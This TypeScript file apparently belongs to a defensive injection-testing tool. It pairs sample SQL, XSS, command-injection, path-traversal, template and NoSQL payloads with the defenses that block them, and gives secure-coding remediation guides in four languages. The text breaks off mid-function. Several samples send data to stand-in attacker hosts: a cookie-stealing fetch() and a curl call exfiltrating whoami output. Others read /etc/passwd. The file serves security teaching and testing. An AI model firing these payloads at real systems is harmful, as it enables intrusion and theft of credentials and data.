export type InjectionCategory = 
  | 'SQLI' 
  | 'XSS' 
  | 'COMMAND_INJECTION' 
  | 'PATH_TRAVERSAL' 
  | 'SSTI' 
  | 'NOSQLI';

export type DefenseProfile = 
  | 'STRICT_ALLOWLIST' 
  | 'HTML_SANITIZER' 
  | 'PARAMETERIZED_SQL' 
  | 'SAFE_PROCESS_EXEC' 
  | 'PATH_CANONICALIZATION' 
  | 'WAF_SIGNATURE_RULESET';

export type DefenseStatus = 'BLOCKED' | 'SANITIZED' | 'FLAGGED' | 'PASS_THROUGH';

export interface DefenseEvaluationItem {
  id: string;
  category: InjectionCategory;
  categoryName: string;
  sampleInput: string;
  targetParam: string;
  description: string;
  appliedDefense: string;
  defenseProfile: DefenseProfile;
  status: DefenseStatus;
  sanitizedOutput: string;
  offendingTokens: string[];
  explanation: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  cwe: string;
  owasp: string;
  remediationSummary: string;
}

export interface DefenseSimulationResult {
  input: string;
  defenseProfile: DefenseProfile;
  profileName: string;
  status: DefenseStatus;
  sanitizedOutput: string;
  detectedTokens: string[];
  matchedRules: string[];
  reasons: string[];
  isSafeToProcess: boolean;
  recommendedFix: {
    language: string;
    vulnerableSnippet: string;
    secureSnippet: string;
    explanation: string;
  };
}

export interface CodeRemediationGuide {
  category: InjectionCategory;
  title: string;
  cwe: string;
  owasp: string;
  description: string;
  languages: {
    id: 'nodejs' | 'python' | 'go' | 'java';
    name: string;
    vulnerableCode: string;
    secureCode: string;
    defenseTechnique: string;
    keyDependencies: string[];
  }[];
}

// Built-in vector catalog for defensive testing
export const DEFENSE_BENCHMARK_SUITE: DefenseEvaluationItem[] = [
  // 1. SQL Injection Vectors
  {
    id: 'sqli-01',
    category: 'SQLI',
    categoryName: 'SQL Injection',
    sampleInput: "' OR '1'='1' --",
    targetParam: 'username',
    description: 'Auth bypass via classic boolean tautology and comment delimiter',
    appliedDefense: 'Parameterized Prepared Statement (PostgreSQL / pg)',
    defenseProfile: 'PARAMETERIZED_SQL',
    status: 'BLOCKED',
    sanitizedOutput: '$1 (Literal string bound to parameter slot; treated as data, never syntax)',
    offendingTokens: ["'", "OR", "'1'='1'", "--"],
    explanation: 'Prepared statement abstracts SQL code structure from user parameters. The string is treated strictly as a column value, eliminating SQL parsing alteration.',
    severity: 'CRITICAL',
    cwe: 'CWE-89',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Use db.query("SELECT * FROM users WHERE username = $1", [username])'
  },
  {
    id: 'sqli-02',
    category: 'SQLI',
    categoryName: 'SQL Injection',
    sampleInput: "1 UNION SELECT username, password_hash, role FROM users--",
    targetParam: 'id',
    description: 'Data exfiltration using UNION operator across multiple columns',
    appliedDefense: 'Strict Type Validation (Zod z.coerce.number().int().positive())',
    defenseProfile: 'STRICT_ALLOWLIST',
    status: 'BLOCKED',
    sanitizedOutput: 'ZodError: Expected integer, received NaN [Rejected HTTP 400 Bad Request]',
    offendingTokens: ["UNION", "SELECT", "--"],
    explanation: 'Schema enforces numerical ID type. Malicious SQL keywords trigger immediate deserialization validation failure before the query is built.',
    severity: 'CRITICAL',
    cwe: 'CWE-89',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'const { id } = z.object({ id: z.coerce.number().int() }).parse(req.query)'
  },
  {
    id: 'sqli-03',
    category: 'SQLI',
    categoryName: 'SQL Injection',
    sampleInput: "admin'; WAITFOR DELAY '0:0:5'--",
    targetParam: 'filter',
    description: 'Time-based blind SQLi via database sleep/delay functions',
    appliedDefense: 'OWASP ModSecurity CRS Rule 942100 (SQLi Detection)',
    defenseProfile: 'WAF_SIGNATURE_RULESET',
    status: 'BLOCKED',
    sanitizedOutput: 'WAF 403 Forbidden [Rule 942100 - SQL Injection Keywords Detected]',
    offendingTokens: ["WAITFOR", "DELAY", "--", ";"],
    explanation: 'WAF signature inspects query string for asynchronous timing primitives and command stacking semicolons.',
    severity: 'CRITICAL',
    cwe: 'CWE-89',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Implement ORM query builders (e.g. Prisma, Drizzle, SQLAlchemy) with parameter bindings.'
  },

  // 2. Cross-Site Scripting (XSS) Vectors
  {
    id: 'xss-01',
    category: 'XSS',
    categoryName: 'Cross-Site Scripting',
    sampleInput: '<script>alert(document.cookie)</script>',
    targetParam: 'comment',
    description: 'Classic reflected/stored script execution tag',
    appliedDefense: 'DOMPurify HTML Sanitizer (DOMPurify.sanitize)',
    defenseProfile: 'HTML_SANITIZER',
    status: 'SANITIZED',
    sanitizedOutput: '',
    offendingTokens: ['<script>', '</script>', 'document.cookie'],
    explanation: 'DOMPurify strips disallowed HTML elements and dangerous execution blocks while preserving legitimate markup.',
    severity: 'HIGH',
    cwe: 'CWE-79',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'const cleanHtml = DOMPurify.sanitize(userInput); or React auto-escaping JSX {userInput}'
  },
  {
    id: 'xss-02',
    category: 'XSS',
    categoryName: 'Cross-Site Scripting',
    sampleInput: '<img src="x" onerror="fetch(\'https://attacker.site/log?c=\'+document.cookie)">',
    targetParam: 'bio',
    description: 'Event-handler based inline XSS payload bypassing simple tag filters',
    appliedDefense: 'Contextual HTML Entity Encoding (he.encode / React JSX)',
    defenseProfile: 'HTML_SANITIZER',
    status: 'SANITIZED',
    sanitizedOutput: '&lt;img src=&quot;x&quot; onerror=&quot;fetch(&#39;https://attacker.site/log?c=&#39;+document.cookie)&quot;&gt;',
    offendingTokens: ['onerror', 'fetch', '<img'],
    explanation: 'HTML entities convert <, >, ", and \' into safe text tokens, forcing the browser to render symbols instead of executing event listeners.',
    severity: 'HIGH',
    cwe: 'CWE-79',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Enforce Content Security Policy (CSP) default-src \'self\'; object-src \'none\'; script-src \'nonce-...\''
  },
  {
    id: 'xss-03',
    category: 'XSS',
    categoryName: 'Cross-Site Scripting',
    sampleInput: 'javascript:alert(1)',
    targetParam: 'redirect_url',
    description: 'Protocol-based pseudo-scheme execution inside href or location attributes',
    appliedDefense: 'Protocol Allowlist Validation (new URL(val).protocol in ["http:", "https:"])',
    defenseProfile: 'STRICT_ALLOWLIST',
    status: 'BLOCKED',
    sanitizedOutput: 'ValidationError: Disallowed URL scheme "javascript:". Only https: and http: are accepted.',
    offendingTokens: ['javascript:'],
    explanation: 'Restricts acceptable destination URLs to authenticated web protocols, neutralizing inline script pseudo-schemes.',
    severity: 'MEDIUM',
    cwe: 'CWE-79',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Validate destination URLs with a strict scheme whitelist before setting href attributes.'
  },

  // 3. Command Injection Vectors
  {
    id: 'cmdi-01',
    category: 'COMMAND_INJECTION',
    categoryName: 'Command Injection',
    sampleInput: '; cat /etc/passwd',
    targetParam: 'host',
    description: 'Command chaining semicolon followed by confidential file reading',
    appliedDefense: 'Safe Non-Shell Process Invocation (child_process.execFile / ProcessBuilder)',
    defenseProfile: 'SAFE_PROCESS_EXEC',
    status: 'BLOCKED',
    sanitizedOutput: 'System Argument: ["; cat /etc/passwd"] passed as single argv argument to binary, not parsed by /bin/sh',
    offendingTokens: [';', 'cat', '/etc/passwd'],
    explanation: 'execFile bypasses the OS command interpreter (/bin/sh). Metacharacters like ; | & are received verbatim by the binary without shell expansion.',
    severity: 'CRITICAL',
    cwe: 'CWE-78',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Use execFile("ping", ["-c", "4", targetHost]) instead of exec("ping -c 4 " + targetHost)'
  },
  {
    id: 'cmdi-02',
    category: 'COMMAND_INJECTION',
    categoryName: 'Command Injection',
    sampleInput: '127.0.0.1 && curl http://malicious.org/exfil?d=$(whoami)',
    targetParam: 'ip',
    description: 'Conditional command execution chaining with environment extraction subshell',
    appliedDefense: 'Strict Regex IP Validation (IPv4 / IPv6 Format Guard)',
    defenseProfile: 'STRICT_ALLOWLIST',
    status: 'BLOCKED',
    sanitizedOutput: 'ValidationError: Value does not match IPv4 format pattern /^(?:\\d{1,3}\\.){3}\\d{1,3}$/',
    offendingTokens: ['&&', 'curl', '$(whoami)'],
    explanation: 'Strict pattern enforcement ensures input conforms strictly to digits and period delimiters, rejecting all shell punctuation.',
    severity: 'CRITICAL',
    cwe: 'CWE-78',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'import { isIP } from "net"; if (!isIP(ipAddress)) throw new Error("Invalid IP address");'
  },
  {
    id: 'cmdi-03',
    category: 'COMMAND_INJECTION',
    categoryName: 'Command Injection',
    sampleInput: '`whoami`',
    targetParam: 'filename',
    description: 'Backtick subshell command substitution evaluation',
    appliedDefense: 'OWASP ModSecurity CRS Rule 932100 (Unix Shell Command Injection)',
    defenseProfile: 'WAF_SIGNATURE_RULESET',
    status: 'BLOCKED',
    sanitizedOutput: 'WAF 403 Forbidden [Rule 932100 - Shell Command Substitution Detected]',
    offendingTokens: ['`', 'whoami'],
    explanation: 'Detects backtick characters and common shell binaries (whoami, id, uname) in HTTP parameters.',
    severity: 'HIGH',
    cwe: 'CWE-78',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'Avoid executing system commands based on client input. Use native Node/Python APIs instead.'
  },

  // 4. Path Traversal & LFI Vectors
  {
    id: 'path-01',
    category: 'PATH_TRAVERSAL',
    categoryName: 'Path Traversal',
    sampleInput: '../../../../etc/passwd',
    targetParam: 'file',
    description: 'Relative dot-dot-slash sequence escaping storage directory to access system files',
    appliedDefense: 'Path Canonicalization & Base Directory Verification',
    defenseProfile: 'PATH_CANONICALIZATION',
    status: 'BLOCKED',
    sanitizedOutput: 'SecurityError: Resolved path "/etc/passwd" is outside safe root "/var/app/uploads/"',
    offendingTokens: ['../', '/etc/passwd'],
    explanation: 'Resolves canonical path with path.resolve() and confirms it starts with the designated safe base path before reading.',
    severity: 'HIGH',
    cwe: 'CWE-22',
    owasp: 'A01:2021-Broken Access Control',
    remediationSummary: 'const target = path.resolve(BASE_DIR, file); if (!target.startsWith(BASE_DIR)) throw new Error("Access Denied");'
  },
  {
    id: 'path-02',
    category: 'PATH_TRAVERSAL',
    categoryName: 'Path Traversal',
    sampleInput: '..%2f..%2f..%2fwindows/win.ini',
    targetParam: 'template',
    description: 'URL-encoded slash path traversal targeting Windows configuration files',
    appliedDefense: 'Basename Isolation (path.basename)',
    defenseProfile: 'PATH_CANONICALIZATION',
    status: 'SANITIZED',
    sanitizedOutput: 'win.ini (Extracted filename only; directory hierarchy stripped)',
    offendingTokens: ['..%2f', 'windows/'],
    explanation: 'path.basename extracts only the final file segment, discarding any prepended directory traversal indicators.',
    severity: 'MEDIUM',
    cwe: 'CWE-22',
    owasp: 'A01:2021-Broken Access Control',
    remediationSummary: 'const safeFilename = path.basename(decodeURIComponent(req.query.file));'
  },

  // 5. Server-Side Template Injection (SSTI)
  {
    id: 'ssti-01',
    category: 'SSTI',
    categoryName: 'Template Injection',
    sampleInput: '{{7*7}}',
    targetParam: 'greeting',
    description: 'Expression evaluation test in Jinja2 / Twig / Nunjucks template engines',
    appliedDefense: 'Logic-less Templating / Context Variable Escaping',
    defenseProfile: 'HTML_SANITIZER',
    status: 'SANITIZED',
    sanitizedOutput: '&#123;&#123;7*7&#125;&#125; (Rendered as literal string characters, not compiled)',
    offendingTokens: ['{{', '}}'],
    explanation: 'User inputs should be passed as data objects to templates, never concatenated directly into template source code strings.',
    severity: 'HIGH',
    cwe: 'CWE-1336',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'render("template.html", { greeting: userInput }) instead of nunjucks.renderString("Hello " + userInput)'
  },

  // 6. NoSQL Injection
  {
    id: 'nosql-01',
    category: 'NOSQLI',
    categoryName: 'NoSQL Injection',
    sampleInput: '{"$gt": ""}',
    targetParam: 'password',
    description: 'MongoDB query selector injection matching any record with string password',
    appliedDefense: 'Zod Strict String Schema (z.string().min(1))',
    defenseProfile: 'STRICT_ALLOWLIST',
    status: 'BLOCKED',
    sanitizedOutput: 'ZodError: Expected string, received object. Query operator injection prevented.',
    offendingTokens: ['$gt', '{"$gt": ""}'],
    explanation: 'Express body parser can deserialize nested objects. Strict validation guarantees password is a string, preventing object operator passing.',
    severity: 'HIGH',
    cwe: 'CWE-943',
    owasp: 'A03:2021-Injection',
    remediationSummary: 'const schema = z.object({ password: z.string().min(8) }); schema.parse(req.body);'
  }
];

// Secure Code Remediation Repository
export const CODE_REMEDIATION_GUIDES: CodeRemediationGuide[] = [
  {
    category: 'SQLI',
    title: 'SQL Injection Defense via Parameterized Queries',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    owasp: 'A03:2021 - Injection',
    description: 'SQL Injection occurs when user data is directly concatenated into dynamic SQL strings. The only comprehensive defense is parameterized queries (prepared statements) or safe ORM mappings.',
    languages: [
      {
        id: 'nodejs',
        name: 'Node.js (TypeScript / pg)',
        vulnerableCode: `// ❌ INSECURE: Vulnerable to SQL Injection via string interpolation
app.get('/api/users', async (req, res) => {
  const { username } = req.query;
  const sql = \`SELECT id, email FROM users WHERE username = '\${username}'\`;
  const result = await db.query(sql); // Attacker injects ' OR '1'='1' --
  res.json(result.rows);
});`,
        secureCode: `// ✅ SECURE: Parameterized prepared statement with Zod schema validation
import { z } from 'zod';

const QuerySchema = z.object({
  username: z.string().min(1).max(50).regex(/^[a-zA-Z0-9_.-]+$/)
});

app.get('/api/users', async (req, res) => {
  const { username } = QuerySchema.parse(req.query);
  // Parameters ($1) are sent separately to the SQL driver and never interpreted as syntax
  const query = 'SELECT id, email FROM users WHERE username = $1';
  const result = await db.query(query, [username]);
  res.json(result.rows);
});`,
        defenseTechnique: 'Parameterized Query Protocol ($1 placeholder) + Schema Allowlist',
        keyDependencies: ['pg', 'zod']
      },
      {
        id: 'python',
        name: 'Python (Psycopg / SQLAlchemy)',
        vulnerableCode: `# ❌ INSECURE: Python f-string query formatting
cursor = connection.cursor()
cursor.execute(f"SELECT id, balance FROM accounts WHERE user_id = '{user_id}'")
# Malicious user_id alters query logic`,
        secureCode: `# ✅ SECURE: Tuple binding parameterization with cursor
cursor = connection.cursor()
# The database engine treats the second argument strictly as data
cursor.execute(
    "SELECT id, balance FROM accounts WHERE user_id = %s",
    (user_id,)
)
record = cursor.fetchone()`,
        defenseTechnique: 'Database cursor parameterized variable binding (%s)',
        keyDependencies: ['psycopg2-binary', 'pydantic']
      },
      {
        id: 'go',
        name: 'Go (database/sql)',
        vulnerableCode: `// ❌ INSECURE: fmt.Sprintf query construction
query := fmt.Sprintf("SELECT id, name FROM users WHERE email = '%s'", email)
rows, err := db.Query(query)`,
        secureCode: `// ✅ SECURE: Parameterized query placeholder ($1 or ?)
query := "SELECT id, name FROM users WHERE email = $1"
rows, err := db.QueryContext(ctx, query, email)
if err != nil {
    return err
}
defer rows.Close()`,
        defenseTechnique: 'Database context parameterization via db.QueryContext',
        keyDependencies: ['database/sql', 'github.com/lib/pq']
      },
      {
        id: 'java',
        name: 'Java (Spring / PreparedStatement)',
        vulnerableCode: `// ❌ INSECURE: Statement concatenation
Statement statement = connection.createStatement();
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
ResultSet rs = statement.executeQuery(sql);`,
        secureCode: `// ✅ SECURE: PreparedStatement parameterization
String sql = "SELECT * FROM users WHERE username = ?";
try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
    pstmt.setString(1, username);
    try (ResultSet rs = pstmt.executeQuery()) {
        // Process results safely
    }
}`,
        defenseTechnique: 'java.sql.PreparedStatement with explicit setString bindings',
        keyDependencies: ['java.sql.PreparedStatement']
      }
    ]
  },
  {
    category: 'XSS',
    title: 'Cross-Site Scripting Defense via Contextual Encoding & CSP',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    owasp: 'A03:2021 - Injection',
    description: 'XSS occurs when untrusted data is included in dynamic web pages without adequate validation or output encoding. Defenses include Contextual HTML encoding, DOMPurify sanitization, and strict CSP.',
    languages: [
      {
        id: 'nodejs',
        name: 'Node.js / React (DOMPurify & CSP)',
        vulnerableCode: `// ❌ INSECURE: Directly injecting raw user HTML into DOM
function CommentView({ rawComment }: { rawComment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: rawComment }} />;
}`,
        secureCode: `// ✅ SECURE: DOMPurify sanitization + Strict Content Security Policy
import DOMPurify from 'dompurify';

// 1. Sanitize before rendering HTML
function CommentView({ rawComment }: { rawComment: string }) {
  const cleanHtml = DOMPurify.sanitize(rawComment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'title']
  });

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// 2. Or prefer standard React JSX auto-escaping for text:
// return <div>{rawComment}</div>;`,
        defenseTechnique: 'DOMPurify HTML sanitizer + JSX Auto-escaping + CSP Nonce',
        keyDependencies: ['dompurify', 'helmet']
      },
      {
        id: 'python',
        name: 'Python (Bleach / html.escape)',
        vulnerableCode: `# ❌ INSECURE: Returning unescaped HTML string in Flask
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    return f"<h1>Hello {name}</h1>"  # Stored/Reflected XSS`,
        secureCode: `# ✅ SECURE: HTML entity escaping or Bleach sanitization
import bleach
import html
from flask import request, render_template

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # Contextual escape converts <, >, &, ", ' into safe entities
    safe_name = html.escape(name)
    # Or pass to Jinja2 template which auto-escapes by default:
    return render_template('greet.html', name=name)`,
        defenseTechnique: 'Contextual HTML entity escaping & Jinja2 Autoescape',
        keyDependencies: ['bleach', 'markupsafe']
      },
      {
        id: 'go',
        name: 'Go (html/template)',
        vulnerableCode: `// ❌ INSECURE: text/template does NOT contextualize HTML
import "text/template"
tmpl, _ := template.New("test").Parse("<h1>Welcome {{.}}</h1>")
tmpl.Execute(w, userInput)`,
        secureCode: `// ✅ SECURE: html/template performs contextual escaping automatically
import "html/template"
// html/template automatically encodes based on context (HTML, attr, JS, URL)
tmpl, err := template.New("safe").Parse("<h1>Welcome {{.}}</h1>")
if err != nil {
    http.Error(w, "Template error", 500)
    return
}
tmpl.Execute(w, userInput)`,
        defenseTechnique: 'Standard library html/template contextual auto-encoding',
        keyDependencies: ['html/template']
      },
      {
        id: 'java',
        name: 'Java (OWASP Java HTML Sanitizer / Spring)',
        vulnerableCode: `// ❌ INSECURE: Direct reflection in JSP or response
response.getWriter().println("<div>" + request.getParameter("bio") + "</div>");`,
        secureCode: `// ✅ SECURE: OWASP Java HTML Sanitizer policy
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;

PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("b", "i", "u", "p")
    .allowUrlProtocols("https")
    .toFactory();

String safeBio = policy.sanitize(request.getParameter("bio"));
response.getWriter().println("<div>" + safeBio + "</div>");`,
        defenseTechnique: 'OWASP Java HTML Sanitizer with strict element whitelist',
        keyDependencies: ['owasp-java-html-sanitizer']
      }
    ]
  },
  {
    category: 'COMMAND_INJECTION',
    title: 'OS Command Injection Defense via Safe Process APIs',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
    owasp: 'A03:2021 - Injection',
    description: 'Command injection occurs when untrusted input is passed to an operating system shell (e.g. /bin/sh or cmd.exe). Defenses require using argv-based APIs (execFile, ProcessBuilder) that do NOT invoke a shell.',
    languages: [
      {
        id: 'nodejs',
        name: 'Node.js (execFile with argv array)',
        vulnerableCode: `// ❌ INSECURE: exec invokes /bin/sh - attacker injects ; rm -rf /
import { exec } from 'child_process';

app.post('/api/ping', (req, res) => {
  const { host } = req.body;
  exec(\`ping -c 4 \${host}\`, (error, stdout) => { // Injection!
    res.send(stdout);
  });
});`,
        secureCode: `// ✅ SECURE: execFile does NOT invoke a shell + strict IP validation
import { execFile } from 'child_process';
import { isIP } from 'net';

app.post('/api/ping', (req, res) => {
  const { host } = req.body;
  
  // 1. Strict allowlist validation
  if (!isIP(host)) {
    return res.status(400).json({ error: 'Valid IP address required' });
  }

  // 2. execFile passes arguments as isolated array elements directly to the binary
  execFile('ping', ['-c', '4', host], { timeout: 5000 }, (error, stdout) => {
    if (error) return res.status(500).json({ error: 'Ping failed' });
    res.json({ output: stdout });
  });
});`,
        defenseTechnique: 'child_process.execFile (No shell) + net.isIP allowlist',
        keyDependencies: ['child_process', 'net']
      },
      {
        id: 'python',
        name: 'Python (subprocess.run with shell=False)',
        vulnerableCode: `# ❌ INSECURE: os.system or subprocess with shell=True
import os
os.system(f"convert {uploaded_file} output.png")  # Attacker injects $(evil)`,
        secureCode: `# ✅ SECURE: subprocess.run with argument list and shell=False (default)
import subprocess
import shlex

# Arguments passed as list; no shell expansion occurs
result = subprocess.run(
    ['convert', uploaded_filename, 'output.png'],
    capture_output=True,
    text=True,
    check=True,
    timeout=10,
    shell=False # Critical: never use shell=True with user data
)`,
        defenseTechnique: 'subprocess.run with list arguments and shell=False',
        keyDependencies: ['subprocess', 'pathlib']
      },
      {
        id: 'go',
        name: 'Go (os/exec.Command)',
        vulnerableCode: `// ❌ INSECURE: Passing command string to sh -c
cmd := exec.Command("sh", "-c", "nslookup " + domain)`,
        secureCode: `// ✅ SECURE: Direct binary execution with discrete arguments
// exec.Command bypasses the shell unless explicitly asked
cmd := exec.CommandContext(ctx, "nslookup", domain)
out, err := cmd.CombinedOutput()`,
        defenseTechnique: 'os/exec.CommandContext with discrete argument array',
        keyDependencies: ['os/exec', 'context']
      },
      {
        id: 'java',
        name: 'Java (ProcessBuilder)',
        vulnerableCode: `// ❌ INSECURE: Runtime.getRuntime().exec with concatenated command string
Runtime.getRuntime().exec("sh -c 'traceroute " + target + "'");`,
        secureCode: `// ✅ SECURE: ProcessBuilder with List arguments
List<String> command = List.of("traceroute", validatedTarget);
ProcessBuilder pb = new ProcessBuilder(command);
pb.redirectErrorStream(true);
Process process = pb.start();`,
        defenseTechnique: 'java.lang.ProcessBuilder with immutable List arguments',
        keyDependencies: ['java.lang.ProcessBuilder']
      }
    ]
  },
  {
    category: 'PATH_TRAVERSAL',
    title: 'Path Traversal Defense via Path Canonicalization & Root Guard',
    cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    owasp: 'A01:2021 - Broken Access Control',
    description: 'Path traversal attacks supply dot-dot sequences (../) to escape restricted directory bounds. Defenses require canonicalizing relative paths and strictly verifying that the result starts with the safe base directory.',
    languages: [
      {
        id: 'nodejs',
        name: 'Node.js (path.resolve & startsWith guard)',
        vulnerableCode: `// ❌ INSECURE: Directly joining unverified file path
app.get('/download', (req, res) => {
  const filePath = '/var/www/uploads/' + req.query.file;
  fs.createReadStream(filePath).pipe(res); // Attacker sends ../../../../etc/passwd
});`,
        secureCode: `// ✅ SECURE: Canonical path verification & basename extraction
import path from 'path';
import fs from 'fs';

const SAFE_UPLOAD_DIR = path.resolve('/var/www/uploads');

app.get('/download', (req, res) => {
  const filename = req.query.file;
  if (typeof filename !== 'string') return res.status(400).send('Invalid file');

  // Method 1: Whitelist safe filename only
  const baseName = path.basename(filename);
  const resolvedPath = path.resolve(SAFE_UPLOAD_DIR, baseName);

  // Method 2: Ensure resolved path is strictly within the permitted folder
  if (!resolvedPath.startsWith(SAFE_UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied: Directory traversal detected' });
  }

  res.sendFile(resolvedPath);
});`,
        defenseTechnique: 'path.resolve canonical resolution + startsWith prefix verification',
        keyDependencies: ['path', 'fs']
      },
      {
        id: 'python',
        name: 'Python (pathlib.Path.resolve)',
        vulnerableCode: `# ❌ INSECURE: os.path.join allows traversal if parameter contains leading slashes or ../
with open(os.path.join(BASE_PATH, user_filename), 'rb') as f:
    return f.read()`,
        secureCode: `# ✅ SECURE: pathlib resolve & relative_to boundary check
from pathlib import Path

BASE_DIR = Path('/var/www/uploads').resolve()

def get_file(user_filename: str):
    target = (BASE_DIR / user_filename).resolve()
    
    # Raises ValueError if target is not inside BASE_DIR
    try:
        target.relative_to(BASE_DIR)
    except ValueError:
        raise PermissionError("Directory traversal detected")
        
    return target.read_bytes()`,
        defenseTechnique: 'pathlib.Path.relative_to containment verification',
        keyDependencies: ['pathlib']
      },
      {
        id: 'go',
        name: 'Go (filepath.Clean & filepath.Rel)',
        vulnerableCode: `// ❌ INSECURE: Simple string concatenation
data, err := os.ReadFile("/data/files/" + userInput)`,
        secureCode: `// ✅ SECURE: filepath.Clean and relative path containment check
cleanPath := filepath.Clean(filepath.Join(baseDir, userInput))
rel, err := filepath.Rel(baseDir, cleanPath)
if err != nil || strings.HasPrefix(rel, "..") {
    http.Error(w, "Forbidden: Directory Traversal", http.StatusForbidden)
    return
}
http.ServeFile(w, r, cleanPath)`,
        defenseTechnique: 'filepath.Clean + filepath.Rel traversal prefix check',
        keyDependencies: ['path/filepath', 'strings']
      },
      {
        id: 'java',
        name: 'Java (Path.normalize & startsWith)',
        vulnerableCode: `// ❌ INSECURE: Direct File instantiation
File file = new File("/uploads", request.getParameter("file"));`,
        secureCode: `// ✅ SECURE: Path normalization and prefix validation
Path basePath = Paths.get("/var/app/uploads").toRealPath();
Path resolvedPath = basePath.resolve(filename).normalize();

if (!resolvedPath.startsWith(basePath)) {
    throw new SecurityException("Directory Traversal Attempt Detected");
}
byte[] content = Files.readAllBytes(resolvedPath);`,
        defenseTechnique: 'java.nio.file.Path.normalize() + startsWith prefix guard',
        keyDependencies: ['java.nio.file.Path', 'java.nio.file.Paths']
      }
    ]
  }
];

// Interactive Defense Evaluator Engine
export function evaluateInputAgainstDefense(
  input: string,
  profile: DefenseProfile
): DefenseSimulationResult {
  const trimmed = input.trim();
  const detectedTokens: string[] = [];
  const matchedRules: string[] = [];
  const reasons: string[] = [];

  switch (profile) {
    case 'STRICT_ALLOWLIST': {
      // Allow only alphanumeric, underscores, hyphens, and dots (e.g. username/id/code)
      const allowedRegex = /^[a-zA-Z0-9_.-]+$/;
      const invalidChars = trimmed.match(/[^a-zA-Z0-9_.-]/g) || [];
      const uniqueInvalid = Array.from(new Set(invalidChars));

      if (uniqueInvalid.length > 0) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'Strict Allowlist Schema (Zod / Regex)',
          status: 'BLOCKED',
          sanitizedOutput: 'ZodError: Disallowed characters rejected. Expected pattern /^[a-zA-Z0-9_.-]+$/',
          detectedTokens: uniqueInvalid,
          matchedRules: ['Zod.string().regex()', 'Character set allowlist constraint'],
          reasons: [
            `Input contains ${uniqueInvalid.length} illegal character(s): ${uniqueInvalid.map(c => JSON.stringify(c)).join(', ')}`,
            'Request halted at input validation middleware before reaching application controller.'
          ],
          isSafeToProcess: false,
          recommendedFix: {
            language: 'TypeScript / Zod',
            vulnerableSnippet: `const { id } = req.query; // No validation`,
            secureSnippet: `const schema = z.string().regex(/^[a-zA-Z0-9_-]+$/);\nschema.parse(req.query.id);`,
            explanation: 'Enforce strict whitelist characters so metacharacters like single quotes, slashes, or semicolons fail validation instantly.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'Strict Allowlist Schema (Zod / Regex)',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['Schema Passed: No disallowed characters detected'],
        reasons: ['Input strictly conforms to alphanumeric and safe delimiter bounds.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'TypeScript',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Input satisfies strict allowlist constraints.'
        }
      };
    }

    case 'HTML_SANITIZER': {
      // Detect HTML tags, attributes, event handlers, javascript schemes
      const scriptMatch = trimmed.match(/<\s*script[^>]*>.*?<\s*\/\s*script\s*>/gi);
      const tagMatch = trimmed.match(/<[^>]+>/g);
      const eventHandlerMatch = trimmed.match(/on\w+\s*=\s*["'][^"']*["']/gi) || trimmed.match(/on\w+\s*=\s*[^\s>]+/gi);
      const jsSchemeMatch = trimmed.match(/javascript:[^\s"'<>]+/gi);

      if (scriptMatch) scriptMatch.forEach(m => detectedTokens.push(m));
      if (eventHandlerMatch) eventHandlerMatch.forEach(m => detectedTokens.push(m));
      if (jsSchemeMatch) jsSchemeMatch.forEach(m => detectedTokens.push(m));
      if (!scriptMatch && tagMatch) tagMatch.forEach(m => detectedTokens.push(m));

      // Simulate HTML entity encoding
      const escaped = trimmed
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');

      if (detectedTokens.length > 0) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'HTML Output Encoding & DOMPurify Sanitizer',
          status: 'SANITIZED',
          sanitizedOutput: escaped,
          detectedTokens: Array.from(new Set(detectedTokens)),
          matchedRules: ['DOMPurify: Strip Disallowed Tags & Handlers', 'Contextual HTML Entity Encoding'],
          reasons: [
            `Detected potential HTML tags or script attributes: ${detectedTokens.slice(0, 3).join(', ')}`,
            'Dangerous markup was converted to safe character entities. The browser will render the text verbatim without script interpretation.'
          ],
          isSafeToProcess: true,
          recommendedFix: {
            language: 'React / DOMPurify',
            vulnerableSnippet: `<div dangerouslySetInnerHTML={{ __html: input }} />`,
            secureSnippet: `<div>{input}</div> // React automatically escapes HTML entities`,
            explanation: 'Always treat untrusted input as text node content rather than executable HTML.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'HTML Output Encoding & DOMPurify Sanitizer',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['No active HTML tags or event handlers identified'],
        reasons: ['No HTML tags or active scripting protocols found.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'HTML / JS',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Input is benign plain text.'
        }
      };
    }

    case 'PARAMETERIZED_SQL': {
